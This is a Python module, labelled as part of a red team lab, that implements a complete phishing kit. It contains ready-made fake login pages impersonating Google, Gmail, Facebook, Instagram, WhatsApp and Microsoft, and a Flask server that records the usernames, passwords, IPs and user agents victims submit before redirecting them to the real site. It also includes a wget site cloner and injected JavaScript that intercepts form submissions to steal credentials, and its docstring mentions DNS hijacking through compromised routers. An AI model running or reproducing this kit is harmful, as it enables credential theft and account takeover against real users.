"""
Phishing module for T's red team lab.
Hosts fake login pages locally, captures credentials in real time.
Supports: pre-built templates + live site cloning via wget.
DNS hijack hook: if router is compromised, redirects real domains here.
"""

import asyncio
import os
import re
import threading
import time
from pathlib import Path
from typing import TYPE_CHECKING
from core.logger import get_logger
from .session_log import get_session

if TYPE_CHECKING:
    from core.ws_server import Client

log = get_logger("lab.phishing")

# Where cloned sites and captured creds are stored
PHISH_DIR = Path(os.path.expanduser("~/.local/share/t-assistant/phishing"))
CRED_LOG  = PHISH_DIR / "captured_creds.txt"

# Global Flask app reference
_flask_thread: threading.Thread | None = None
_flask_running = False
_captured_creds: list[dict] = []
_client_ref: "Client | None" = None


# ── Pre-built HTML templates ───────────────────────────────────────────────────

TEMPLATES: dict[str, dict] = {
    "google": {
        "name":   "Google Login",
        "domain": "accounts.google.com",
        "html":   """<!DOCTYPE html><html><head><title>Sign in – Google Accounts</title>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Roboto,sans-serif;background:#fff;display:flex;justify-content:center;padding-top:80px}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:360px}
h1{font-size:24px;font-weight:400;color:#202124;margin:0 0 8px}
.sub{color:#202124;font-size:14px;margin-bottom:32px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:24px;outline:none}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
.btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;cursor:pointer;float:right}
</style></head><body><div class="card">
<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" width="75">
<h1>Sign in</h1><p class="sub">Use your Google Account</p>
<form method="POST" action="/capture">
<input type="email" name="username" placeholder="Email or phone" required autofocus>
<input type="password" name="password" placeholder="Enter your password" required>
<button class="btn" type="submit">Next</button>
</form></div></body></html>""",
    },
    "facebook": {
        "name":   "Facebook Login",
        "domain": "www.facebook.com",
        "html":   """<!DOCTYPE html><html><head><title>Facebook – log in or sign up</title>
<meta charset="utf-8"><style>
body{margin:0;font-family:Helvetica,Arial,sans-serif;background:#f0f2f5}
.top{background:#1877f2;padding:0;display:flex;justify-content:center;align-items:center;height:56px}
.top span{color:#fff;font-size:24px;font-weight:700}
.center{display:flex;justify-content:center;align-items:center;min-height:calc(100vh - 56px);gap:80px;padding:40px}
.tagline h2{font-size:28px;font-weight:400;color:#1c1e21;max-width:380px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:24px;width:396px}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;box-sizing:border-box;margin-bottom:12px;outline:none}
.btn{width:100%;background:#1877f2;color:#fff;border:none;border-radius:6px;padding:14px;font-size:20px;font-weight:700;cursor:pointer}
</style></head><body>
<div class="top"><span>facebook</span></div>
<div class="center"><div class="tagline"><h2>Connect with friends and the world around you on Facebook.</h2></div>
<div class="card"><form method="POST" action="/capture">
<input type="email" name="username" placeholder="Email address or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button class="btn" type="submit">Log In</button>
</form></div></div></body></html>""",
    },
    "instagram": {
        "name":   "Instagram Login",
        "domain": "www.instagram.com",
        "html":   """<!DOCTYPE html><html><head><title>Instagram</title>
<meta charset="utf-8"><style>
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px;text-align:center}
.logo{font-size:35px;font-family:'Grand Hotel',cursive,serif;margin-bottom:32px;color:#262626}
input{width:100%;padding:9px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;color:#262626;font-size:12px;box-sizing:border-box;margin-bottom:6px;outline:none}
.btn{width:100%;background:#0095f6;color:#fff;border:none;border-radius:4px;padding:7px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
</style></head><body><div class="card">
<div class="logo">Instagram</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button class="btn" type="submit">Log In</button>
</form></div></body></html>""",
    },
    "whatsapp": {
        "name":   "WhatsApp Web",
        "domain": "web.whatsapp.com",
        "html":   """<!DOCTYPE html><html><head><title>WhatsApp Web</title>
<meta charset="utf-8"><style>
body{margin:0;font-family:'Segoe UI',Helvetica,Arial,sans-serif;background:#f0f0f0}
.header{background:#00a884;padding:18px 24px;display:flex;align-items:center;gap:12px}
.header span{color:#fff;font-size:20px;font-weight:500}
.center{display:flex;justify-content:center;align-items:center;min-height:calc(100vh - 60px)}
.card{background:#fff;border-radius:3px;box-shadow:0 1px 3px rgba(0,0,0,.15);padding:40px;width:340px;text-align:center}
h2{color:#41525d;font-weight:300;font-size:28px;margin-bottom:8px}
p{color:#667781;font-size:14px;margin-bottom:28px}
input{width:100%;padding:10px 14px;border:1px solid #d1d7db;border-radius:6px;font-size:15px;box-sizing:border-box;margin-bottom:12px;outline:none}
.btn{width:100%;background:#00a884;color:#fff;border:none;border-radius:8px;padding:12px;font-size:15px;font-weight:500;cursor:pointer}
</style></head><body>
<div class="header">💬 <span>WhatsApp</span></div>
<div class="center"><div class="card">
<h2>Link your phone</h2>
<p>Enter your phone number to continue</p>
<form method="POST" action="/capture">
<input type="tel" name="username" placeholder="+1 (555) 000-0000" required>
<input type="text" name="password" placeholder="Verification code">
<button class="btn" type="submit">Continue</button>
</form></div></div></body></html>""",
    },
    "gmail": {
        "name":   "Gmail Login",
        "domain": "mail.google.com",
        "html":   """<!DOCTYPE html><html><head><title>Gmail</title>
<meta charset="utf-8"><style>
body{font-family:Roboto,sans-serif;background:#fff;display:flex;justify-content:center;padding-top:60px}
.card{max-width:400px;width:100%;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}
.header{text-align:center;margin-bottom:32px}
.logo{font-size:22px;color:#ea4335;font-weight:500}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:20px;outline:none}
input:focus{border-color:#1a73e8}
.btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;cursor:pointer;float:right}
</style></head><body><div class="card">
<div class="header"><div class="logo">Gmail</div>
<h1>Sign in</h1></div>
<form method="POST" action="/capture">
<input type="email" name="username" placeholder="Email" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button class="btn" type="submit">Next</button>
</form></div></body></html>""",
    },
    "microsoft": {
        "name":   "Microsoft Login",
        "domain": "login.microsoftonline.com",
        "html":   """<!DOCTYPE html><html><head><title>Sign in to your account</title>
<meta charset="utf-8"><style>
body{margin:0;font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;padding:44px;width:400px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.logo{color:#0078d4;font-size:23px;font-weight:600;margin-bottom:24px}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:20px}
input{width:100%;padding:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;box-sizing:border-box;margin-bottom:24px;outline:none;background:transparent}
input:focus{border-bottom-color:#0078d4}
.btn{background:#0078d4;color:#fff;border:none;padding:10px 20px;font-size:15px;cursor:pointer}
</style></head><body><div class="card">
<div class="logo">Microsoft</div>
<h1>Sign in</h1>
<form method="POST" action="/capture">
<input type="email" name="username" placeholder="Email, phone, or Skype" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button class="btn" type="submit">Next</button>
</form></div></body></html>""",
    },
}


# ── Flask server ───────────────────────────────────────────────────────────────

def _build_flask_app(template_html: str, redirect_url: str):
    """Build the Flask app for a single phishing session."""
    try:
        from flask import Flask, request, redirect as flask_redirect, make_response
    except ImportError:
        return None

    app = Flask(__name__)
    app.config["PROPAGATE_EXCEPTIONS"] = False

    @app.route("/", methods=["GET"])
    def index():
        return make_response(template_html)

    @app.route("/capture", methods=["POST"])
    def capture():
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        ip       = request.remote_addr or ""
        ua       = request.headers.get("User-Agent", "")
        ts       = time.strftime("%H:%M:%S")

        entry = {
            "ts": ts, "ip": ip, "username": username,
            "password": password, "user_agent": ua,
        }
        _captured_creds.append(entry)
        get_session().add_cred("phishing", username, password, f"IP:{ip}")

        # Write to log file
        PHISH_DIR.mkdir(parents=True, exist_ok=True)
        with open(CRED_LOG, "a") as f:
            f.write(f"[{ts}] {ip} | {username} | {password} | {ua}\n")

        # Notify T brain (will be picked up by polling)
        log.info(f"CRED CAPTURED: {username}:{password} from {ip}")

        # Redirect to real site after capture
        return flask_redirect(redirect_url or "https://google.com", 302)

    @app.route("/health")
    def health():
        return "OK"

    return app


def start_phishing_server(template_html: str, port: int = 80,
                           redirect_url: str = "https://google.com") -> bool:
    """Start the Flask phishing server in a background thread."""
    global _flask_thread, _flask_running

    if _flask_running:
        return True

    app = _build_flask_app(template_html, redirect_url)
    if app is None:
        return False

    def _run():
        global _flask_running
        _flask_running = True
        try:
            app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
        finally:
            _flask_running = False

    _flask_thread = threading.Thread(target=_run, daemon=True)
    _flask_thread.start()
    log.info(f"Phishing server started on port {port}")
    return True


def stop_phishing_server() -> None:
    global _flask_running
    _flask_running = False
    # Flask dev server stops when thread is killed (daemon=True)
    log.info("Phishing server stopped")


def get_captured_creds() -> list[dict]:
    return list(_captured_creds)


def clear_creds() -> None:
    _captured_creds.clear()


# ── Site cloner ────────────────────────────────────────────────────────────────

async def clone_site_vm(url: str, out_dir: str = "/tmp/phish_clone") -> tuple[bool, str]:
    """
    Clone a website on the VM using wget.
    Returns (success, index_path).
    """
    from offensive.vm_bridge import vm as vm_bridge

    cmd = (
        f"rm -rf {out_dir} && "
        f"wget -q --mirror --convert-links --adjust-extension "
        f"--no-parent --no-check-certificate -P {out_dir} '{url}' 2>&1 | tail -5 && "
        f"echo 'CLONE_DONE'"
    )
    success = False
    output  = []
    async for line in vm_bridge.run(cmd, timeout=120):
        output.append(line)
        if "CLONE_DONE" in line:
            success = True

    if success:
        return True, out_dir
    return False, "\n".join(output[-5:])


def inject_cred_capture(html: str, redirect_url: str = "") -> str:
    """
    Inject credential capture JavaScript into a cloned page.
    Intercepts form submit, POSTs creds to /capture, then redirects.
    """
    inject = f"""
<script>
(function(){{
  document.querySelectorAll('form').forEach(function(form){{
    form.addEventListener('submit', function(e){{
      e.preventDefault();
      var data = new FormData(form);
      var creds = {{}};
      data.forEach(function(v,k){{ creds[k]=v; }});
      fetch('/capture', {{
        method:'POST',
        headers:{{'Content-Type':'application/x-www-form-urlencoded'}},
        body: Object.keys(creds).map(k=>k+'='+encodeURIComponent(creds[k])).join('&')
      }}).then(function(){{
        window.location = '{redirect_url or "https://google.com"}';
      }});
    }});
  }});
}})();
</script>
"""
    if "</body>" in html:
        return html.replace("</body>", inject + "</body>")
    return html + inject
